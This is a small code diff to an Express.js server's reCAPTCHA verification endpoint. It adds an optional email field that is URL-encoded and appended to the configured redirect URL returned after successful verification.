@@ -54,7 +54,7 @@ app.get('/health', (req, res) => {
 
 // reCAPTCHA Verification (With Connection Timeout Fix)
 app.post('/verify-token', async (req, res) => {
-  const { token } = req.body;
+  const { token, email } = req.body;
   const secret = process.env.RECAPTCHA_SECRET;
 
   // Validate token format
@@ -95,9 +95,15 @@ app.post('/verify-token', async (req, res) => {
       });
     }
 
+    // Build redirect URL with email if provided
+    let redirectUrl = process.env.REDIRECT_URL || 'https://default-redirect.com';
+    if (email) {
+      redirectUrl = `${redirectUrl.replace(/\/$/, '')}/${encodeURIComponent(email)}`;
+    }
+
     return res.json({
       success: true,
-      redirect: process.env.REDIRECT_URL || 'https://default-redirect.com',
+      redirect: redirectUrl,
       score
     });
 
